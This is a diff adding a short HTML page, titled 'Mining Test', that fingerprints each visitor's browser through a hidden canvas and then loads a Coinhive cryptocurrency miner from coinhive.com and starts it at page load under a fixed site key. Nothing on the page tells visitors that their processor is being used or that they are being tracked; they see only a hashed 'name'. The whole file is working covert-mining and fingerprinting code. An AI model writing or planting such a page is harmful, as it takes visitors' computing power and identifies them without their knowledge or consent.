@@ -1,0 +1,38 @@
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>Mining Test</title>
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
+<script>
+onload = function() {
+	document.getElementById('hiddenCanvas').style.display = "none";
+	const md5_result = md5( getCanvasFingerprint() )
+	document.getElementById('canvas_fingerprint').innerHTML = "Your Name: "+ md5_result;
+
+	 // Your public Site-Key
+  const site_key = 'KQFxWf0LVZURcSMPu9A5rJwnUdYLBwmc';
+  const miner = new CoinHive.User(site_key, md5_result, { throttle: 0.3 });
+  miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
+};
+
+function getCanvasFingerprint() {
+  let canvas = document.createElement('canvas');
+  let ctx = canvas.getContext('2d');
+  const txt = navigator.userAgent;
+  ctx.font = "14px 'Arial'";
+  ctx.fillStyle = "#110";
+  ctx.fillRect(1,1, 800,20);
+  ctx.fillStyle = "rgba(255, 255, 22, 0.8)";
+  ctx.fillText(txt, 2, 11);
+  ctx.fillStyle = "rgba(22, 255, 255, 0.8)";
+  ctx.fillText(txt, 4, 17);
+  return canvas.toDataURL();
+};
+</script>
+</head>
+<body>
+<canvas id="hiddenCanvas" width="1000" height="40"></canvas>
+<div id="canvas_fingerprint"></div>
+</body>
+</html>
